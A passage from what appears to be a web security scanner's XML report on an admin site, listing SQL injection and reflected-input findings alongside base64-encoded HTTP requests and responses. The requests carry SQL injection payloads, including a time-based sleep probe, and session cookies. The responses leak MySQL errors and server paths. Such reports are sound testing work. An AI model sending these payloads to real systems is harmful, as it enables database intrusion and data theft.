XBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1Mzo1NCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODc3DQpTZXQtQ29va2llOiBBV1NBTEI9TEtWaWJrTjhuQUdtcGVoVFYwTHVHdVVMOTJFWkMzQ2NreWFZS1p1aXd3TjF2dG8vanpWbVk5bEdOS1czM0FIZ0g4RHhnM3RFcC9RNHFtY01rWnZ2SWZ3cUdQMENJRVdXMm9PMHFQVlljVE42dXUzRDA1V2FCdFZXN1ZqKzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUzOjU0IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUxLVmlia044bkFHbXBlaFRWMEx1R3VVTDkyRVpDM0Nja3lhWUtadWl3d04xdnRvL2p6Vm1ZOWxHTktXMzNBSGdIOER4ZzN0RXAvUTRxbWNNa1p2dklmd3FHUDBDSUVXVzJvTzBxUFZZY1RONnV1M0QwNVdhQnRWVzdWais7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1Mzo1NCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJywgdGltZXpvbmU9JycsIGlzX2RlbGV0ZWQ9MCwgaXNfYWN0aXZlPTEsIGV4dGVybmFsX2lkPScnLCBvZmZsaW5lX2Rpc3BlbnNlcl9ub3QnIGF0IGxpbmUgMSBpbiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDozMgpTdGFjayB0cmFjZToKIzAgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHAoMzIpOiBteXNxbGktJmd0O3F1ZXJ5KCd1cGRhdGUgdXNlciBzZXQuLi4nKQojMSAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL21vZGVscy9Vc2VyLnBocCg0MzkpOiBEYlV0aWw6Omluc2VydFJlY29yZChPYmplY3QobXlzcWxpKSwgJ3VwZGF0ZSB1c2VyIHNldC4uLicpCiMyIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vY29udHJvbGxlci9Vc2VyUHJvZmlsZUNvbnRyb2xsZXIucGhwKDEyNSk6IFVzZXItJmd0O3NhdmUoKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJzM5OScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjMyPC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPTEvdkZsQU0zWmFTWjArKzFqTXVidUxzTm5ycmdTNUdIQjJBWG1xQVhtbUxralRoWE0vZEhZOGFxV2dzTThMZDR2UVlqQ1dkNHhMMG9Zdlo3S1doOUxSdjBRQjdrNFU0U1NLWG5za0JCU0FPUEE4RmRncHV5TWZDL2taQlA7IEFXU0FMQkNPUlM9MS92RmxBTTNaYVNaMCsrMWpNdWJ1THNObnJyZ1M1R0hCMkFYbXFBWG1tTGtqVGhYTS9kSFk4YXFXZ3NNOExkNHZRWWpDV2Q0eEwwb1l2WjdLV2g5TFJ2MFFCN2s0VTRTU0tYbnNrQkJTQU9QQThGZGdwdXlNZkMva1pCUA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1NDoxNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzANClNldC1Db29raWU6IEFXU0FMQj1XSGFYcXVQbWlRc0ZwdTFZTmFDenVHbmtaNTZSSnp5aVE1VWgxck40Y0RXaHcvSGJwcEdXR2c2NFNiQWVkVlVxWWVtUE4xcGl1RDhSOXNiQkNIVDNKd3BYQkUwbFFiTFpiVUVYdFpkazhmUG5vUmFSTWpJNDVJT01JQlJ5OyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTM6NTUgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9V0hhWHF1UG1pUXNGcHUxWU5hQ3p1R25rWjU2Ukp6eWlRNVVoMXJONGNEV2h3L0hicHBHV0dnNjRTYkFlZFZVcVllbVBOMXBpdUQ4UjlzYkJDSFQzSndwWEJFMGxRYkxaYlVFWHRaZGs4ZlBub1JhUk1qSTQ1SU9NSUJSeTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUzOjU1IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiU1VDQ0VTUyJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6414075426792112128</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399 [entriesPerPage parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>entriesPerPage</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUljelJIUFVDQUpRZzNXTTJLOEJtQ3c1V0FDdmZnTm11S0N5TUh3OWdhbkNVU0FaZytCM3RNUU1mWS93MDJNelZyY1pNdUVmTXJQVS9QVzd4ZHh6c09KVmxqYThHc29XaW9JNWV3cTNFNE54ZnV6NTJmRm13bVpWd2NpbHQ7IEFXU0FMQkNPUlM9SWN6UkhQVUNBSlFnM1dNMks4Qm1DdzVXQUN2ZmdObXVLQ3lNSHc5Z2FuQ1VTQVpnK0IzdE1RTWZZL3cwMk16VnJjWk11RWZNclBVL1BXN3hkeHpzT0pWbGphOEdzb1dpb0k1ZXdxM0U0TnhmdXo1MmZGbXdtWlZ3Y2lsdA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MHllN2k4cDJtNzg=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1NToyNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNjk2DQpTZXQtQ29va2llOiBBV1NBTEI9R1Z1cWpOZ2g3ZUUwdVhlbE9EOVB0ZHRRR2lEYWtmcVcwSHhTTGVtY1RQVS81dE1Eb0NUSkxRVktRWm9odytqd2M4Q1hrUWRMSjRjRGVDcE1LYmovdlJ5Z3gvZnRMQnByc0xMTmpieFNuUkR6RStCaExaNDdwWU5uMkRxSTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU1OjI2IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUdWdXFqTmdoN2VFMHVYZWxPRDlQdGR0UUdpRGFrZnFXMEh4U0xlbWNUUFUvNXRNRG9DVEpMUVZLUVpvaHcrandjOENYa1FkTEo0Y0RlQ3BNS2JqL3ZSeWd4L2Z0TEJwcnNMTE5qYnhTblJEekUrQmhMWjQ3cFlObjJEcUk7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1NToyNiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJzUweWU3aThwMm03OCcgaW4gJ2ZpZWxkIGxpc3QnIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjMyClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgzMik6IG15c3FsaS0mZ3Q7cXVlcnkoJ3VwZGF0ZSB1c2VyIHNldC4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDQzOSk6IERiVXRpbDo6aW5zZXJ0UmVjb3JkKE9iamVjdChteXNxbGkpLCAndXBkYXRlIHVzZXIgc2V0Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoMTI1KTogVXNlci0mZ3Q7c2F2ZSgpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnMzk5JywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MzI8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8900198271777839104</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399 [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li><li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li><li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The URL path filename appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the URL path filename, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JyBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWVybHB2ZmpiMWlnajdvZ2w0aDFwNnBwY2JlOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1DbDFMMHpCZ1habFI2d1lzbWJWK1J4QWRLczc3RVo3amUvbFc3QmZmUjV1YmlpT2RvVUE4VFZrV3AwVGZ3NU9HbjJFMVFqbVVzSFZFbE5UV1pSL1BETWtPaGFhdW52YzZtNnN2OW1yQ251STA2SFdtdEpGcUx3T1hwdTI3OyBBV1NBTEJDT1JTPUNsMUwwekJnWFpsUjZ3WXNtYlYrUnhBZEtzNzdFWjdqZS9sVzdCZmZSNXViaWlPZG9VQThUVmtXcDBUZnc1T0duMkUxUWptVXNIVkVsTlRXWlIvUERNa09oYWF1bnZjNm02c3Y5bXJDbnVJMDZIV210SkZxTHdPWHB1MjcNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1ODo1MyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODAzDQpTZXQtQ29va2llOiBBV1NBTEI9VUdLSmZHZmlBeHY3QXRGYjE3WjdVWUpKNDh1ZjIrTDBRelQyenRUbUxsazA4YzExYnJQMEplcVRjZjhZTUkzeDRzdE5FcTZ2YUVFNTkvQ1FGOExiMEh3YytaS3RFRWUweWtkdWtHVjhwS3kwc1dKQXRxbUU3ejNiN290UjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU4OjUzIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPVVHS0pmR2ZpQXh2N0F0RmIxN1o3VVlKSjQ4dWYyK0wwUXpUMnp0VG1MbGswOGMxMWJyUDBKZXFUY2Y4WU1JM3g0c3RORXE2dmFFRTU5L0NRRjhMYjBId2MrWkt0RUVlMHlrZHVrR1Y4cEt5MHNXSkF0cW1FN3ozYjdvdFI7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1ODo1MyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJycgYXQgbGluZSAxIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OScnKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJzM5OScnLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4868718147947846656</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399 [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
